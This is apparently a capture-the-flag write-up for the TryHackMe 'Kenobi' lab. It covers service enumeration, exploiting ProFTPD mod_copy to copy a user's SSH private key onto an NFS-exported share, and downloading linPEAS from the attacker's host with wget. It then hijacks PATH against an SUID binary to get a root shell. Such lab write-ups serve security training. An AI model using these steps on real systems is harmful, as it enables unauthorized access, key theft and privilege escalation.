# Kenobi

**IP Address: 10.10.243.180**

I first tried to visit the given IP address using my web browser to see if it hosted any website. I was greeted with the following website (Port 80 is open for HTTP):

<img style="float: left;" src="screenshots/screenshot1.png">

To enumerate the server information, I then tried accessing random directories to see if any server information and port information can be found. Surely enough, trying **"**[**http://10.10.243.180/admin**](http://10.10.243.180/admin)**"** gave us a page that told us that the server was an **Apache/2.4.18 (Ubuntu) Server** running at 10.10.243.180 Port 80!

Next, I ran an nmap scan on the server. I ran two nmap scans at one time, a thorough one that scans all ports (which takes a long time), as well as a faster one that only scans the top 1000 ports. The commands used are as follows:

```
### Thorough
nmap -sV -p- -vv 10.10.243.180

### Quick
nmap -sV -vv 10.10.243.180
```



While I left the thorough nmap scan running in the background, I analyzed the results of the Quick nmap scan, which told me that ports **21 (ftp), 22 (ssh), 80 (http), 111 (Remote Procedure Call), 139 (samba), 445 (samba) and 2049 (rpc)** were open.  

While the room suggests that exploitation of the server would most probably be done through ftp or samba exploitation, I decided to use **gobuster** to see if there are any hidden directories that can be enumerated. The command used is 

```
gobuster dir -u http://10.10.243.180 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

I doubt there will be any useful directories found, but I've learnt that it is always good to check just in case!



While previously, I learned to enumerate samba shares using a tool, **enum4linux,** this time, I used nmap scripts to do the enumeration. The command used is:

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.243.180
```

**Port 445** was specified as it is the port that hosted samba. The results are as follows:

<img style="float: left;" src="screenshots/screenshot2.png">

As we can see, 3 shares were enumerated, **IPC$, anonymous and print$**. By using **smbclient**, I tried logging into the "**anonymous**" share, and it allowed me to do so without requiring any authentication! 



Using the command **ls** revealed that there was a **log.txt** file:

<img style="float: left;" src="screenshots/screenshot3.png">



The "**log.txt**" file was just a basic ProFTPD configuration file, which gave us a lot of interesting and potentially useful information about the server. The port that FTP was running on was port **21**.

Now we have to make use of port **111**, which hosts **RPC**. 

*Remote Procedure Call (RPC) is a protocol that one program can use to request a service from a program located in another computer on a network without having to understand the network's details. RPC is used to call other processes on the remote systems like a local system. A procedure call is also sometimes known as a function call or a subroutine call.*



In our case, port 111 is access to a network file system. So I could use nmap to enumerate it with specific scripts:

```
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.243.180
```

<img style="float: left;" src="screenshots/screenshot4.png">

Hence, we can see that **/var** is a mount!

I can use **netcat** to connect to the machine on its ftp port! This can be done via:

```
nc 10.10.243.180 21
```



With that, I successfully connected to the ftp server.

I then used a tool called **searchsploit**, which is just a command-line search tool for exploit-db, to find exploits for proftpd 1.3.5. It gave me 3 possible exploits that could be used! The command is:

```
searchsploit proftpd 1.3.5
```

<img style="float: left;" src="screenshots/screenshot5.png">



The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

From the **log.txt** file earlier, I know that the **id_rsa** file of user, **kenobi,** can be found in **/home/kenobi/.ssh/id_rsa**. With knowledge of the mount point, **/var**, I can mount my local computer to the machine, and use that to obtain the **id_rsa** file. This will then allow me to access the machine via **ssh** as user kenobi!



To do this, first, I used the **SITE CPFR** and **SITE CPTO** commands to copy the id_rsa file from kenobi's home folder to the **/var/tmp** folder. 

<img style="float: left;" src="screenshots/screenshot6.png">



Next, I created a directory in my local computer's /mnt directory, using:

```
sudo mkdir /mnt/kenobiNFS
```

I then mounted the **/var** directory onto my local computer using:

```
sudo mount MACHINE_IP:/var /mnt/kenobiNFS
```

From there, I could just navigate to the **/tmp** folder and obtain the **id_rsa** file.

<img style="float: left;" src="screenshots/screenshot7.png">



I then copied the id_rsa file over to my desktop, changed its permissions to be read and write by owner only, using 

```
chmod 600 id_rsa
```

I could then ssh into the machine with the rsa key:

```
ssh kenobi@10.10.243.180 -i id_rsa
```

 

#### With that, I obtained the flag from "user.txt", which was located in the home directory of the user kenobi.



---

Next is privilege escalation. In this case, Path Variable Manipulation will be exploited with SUID binaries. The TryHackMe room taught me to use the command:

```
find / -perm -u=s -type f 2>/dev/null
```

to find any out-of-the-ordinary files. 

However, I decided to use another  privilege-escalation script, **linPEAS,** to speed things up! 

On my local computer, I hosted a simple HTTP server using Python's in-built server. I first cd'ed into the linPEAS directory, which contained the **linpeas.sh** file that I wanted to send over to the machine. I then started the server using: 

```
python3 -m http.server
```

This creates a server at the default port **8000**. 

In the victim machine, I used

```
wget http://10.4.6.205:8000/linpeas.sh
```

After successfully downloading, I just had to make it an executable before I could run it! 



After running linpeas, I noticed that there was an interesting file that had its SUID bit set => **/usr/bin/menu**:

<img style="float: left;" src="screenshots/screenshot8.png">



Upon running the menu binary, I came across some interesting options:

<img style="float: left;" src="screenshots/screenshot9.png">

It would seem as if the binary just allowed us to run certain commands from within it. However, the important thing to note is that we would be running the commands as **ROOT** (due to the SUID bit being set) .

Using the command "**strings**", which allows us to look for human-readable strings on a binary, in this case, on **menu,** 

<img style="float: left;" src="screenshots/screenshot10.png">

it tells us that the commands run in the binary are done without using their full paths. (e.g. not using /usr/bin/curl or /usr/bin/uname)

Hence, we can manipulate our **PATH** to gain a root shell.

First, copy the **/bin/sh** shell into a new file called **curl**. Give it the proper permissions (**777**), then put its location into our **PATH**. Since when the /usr/bin/menu binary is run, its using our path variable to find the "curl" binary, it will run the "curl" binary that we created earlier on,which is actually a version of **/usr/sh**. Thus a shell will be opened as root, which means that we have successfully escalated our privileges.

<img style="float: left;" src="screenshots/screenshot11.png">

*(Example given in TryHackMe)*

Hence, when I run the menu binary and run option 1, which uses the "curl" binary that I created earlier on, I will be able to gain access to a root shell as root.

<img style="float: left;" src="screenshots/screenshot12.png">



#### With that, I obtained the flag from "root.txt", which was located in the home directory of the root user.





